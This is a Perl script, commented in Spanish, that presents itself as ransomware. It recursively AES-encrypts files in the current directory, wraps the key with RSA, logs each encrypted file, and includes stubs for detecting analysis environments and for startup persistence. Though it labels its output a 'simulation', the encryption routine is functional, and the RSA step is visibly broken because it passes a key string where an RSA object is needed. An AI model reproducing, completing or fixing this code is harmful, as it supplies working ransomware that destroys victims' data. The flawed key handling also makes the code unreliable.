use strict;
use warnings;
use Crypt::CBC;
use Crypt::OpenSSL::RSA;
use Crypt::OpenSSL::Random qw(random_bytes);
use File::Find;
use File::Basename;
use File::Slurp;
use IO::Handle;

# Definir constantes
use constant {
    KEY_SIZE => 32,   # Tamaño de la clave AES (256 bits)
    IV_SIZE  => 16,   # Tamaño del IV
    RSA_KEY_SIZE => 2048, # Tamaño de la clave RSA
};

# Extensiones de archivos a excluir
my @exclude_extensions = (".exe", ".dll", ".sys", ".enc");

# Función para verificar si un archivo debe ser cifrado
sub should_encrypt {
    my ($filename) = @_;
    foreach my $ext (@exclude_extensions) {
        return 0 if ($filename =~ /\Q$ext\E$/);
    }
    return 1;  # Cifrar
}

# Función para verificar si el ransomware está en un entorno de análisis
sub is_in_analysis_environment {
    # Aquí se puede implementar una verificación real
    return 0;  # Simulamos que no está en un entorno de análisis
}

# Función para generar una clave simétrica para AES
sub generate_aes_key {
    return random_bytes(KEY_SIZE);
}

# Función para cifrar un archivo con AES
sub aes_encrypt_file {
    my ($in_filename, $out_filename, $key) = @_;

    # Crear objeto de cifrado
    my $cipher = Crypt::CBC->new(-cipher => 'Crypt::OpenSSL::AES',
                                  -key    => $key,
                                  -header => 'random');

    # Leer el archivo y cifrar
    open my $in_file, '<', $in_filename or die "Error al abrir el archivo de entrada: $!";
    open my $out_file, '>', $out_filename or die "Error al abrir el archivo de salida: $!";

    my $plaintext = do { local $/; <$in_file> };  # Leer todo el archivo
    my $ciphertext = $cipher->encrypt($plaintext); # Cifrar

    print $out_file $ciphertext;  # Escribir en el archivo cifrado
    close $in_file;
    close $out_file;
}

# Función para cifrar la clave AES con la clave pública RSA
sub rsa_encrypt_key {
    my ($rsa, $key) = @_;
    my $encrypted_key = $rsa->encrypt($key);
    return $encrypted_key;
}

# Función para generar un par de claves RSA
sub generate_rsa_keys {
    my $rsa = Crypt::OpenSSL::RSA->generate_key(RSA_KEY_SIZE);
    return ($rsa->get_public_key_string(), $rsa->get_private_key_string());
}

# Función para cifrar todos los archivos en el directorio actual
sub encrypt_files_in_directory {
    my ($rsa_public) = @_;
    my $aes_key = generate_aes_key();  # Generar clave AES
    my $encrypted_key = rsa_encrypt_key($rsa_public, $aes_key);

    find(sub {
        return unless -f;  # Solo archivos regulares
        my $filename = $_;

        if (should_encrypt($filename)) {
            my $out_filename = "$filename.enc";  # Sufijo del archivo cifrado
            aes_encrypt_file($filename, $out_filename, $aes_key);
            # Guardar la clave cifrada en un archivo
            open my $key_file, '>', 'encrypted_key.bin' or die "Error al guardar la clave cifrada: $!";
            print $key_file $encrypted_key;
            close $key_file;

            # Registrar el archivo cifrado
            open my $log_file, '>>', 'ransomware.log' or die "Error al registrar el archivo cifrado: $!";
            print $log_file "Archivo cifrado: $filename\n";
            close $log_file;
        }
    }, '.');  # Directorio actual
}

# Función principal
sub main {
    # Semilla para la aleatoriedad
    srand(time());  # Semilla para la aleatoriedad

    # Comprobar si el script está en un entorno de análisis
    if (is_in_analysis_environment()) {
        print "Entorno de análisis detectado. Salida.\n";
        return;
    }

    my ($rsa_public, $rsa_private) = generate_rsa_keys();  # Generar claves RSA

    # Añadir el ransomware al inicio del sistema (simulación)
    print "Simulando la adición del ransomware al inicio del sistema...\n";

    # Cifrar archivos en el directorio actual (simulación)
    print "Simulando el cifrado de archivos...\n";
    encrypt_files_in_directory($rsa_public);

    print "Simulación completada.\n";

    # Liberar recursos RSA
    # No es necesario liberar en Perl como en C, pero se puede hacer si se utilizan objetos
}

main();
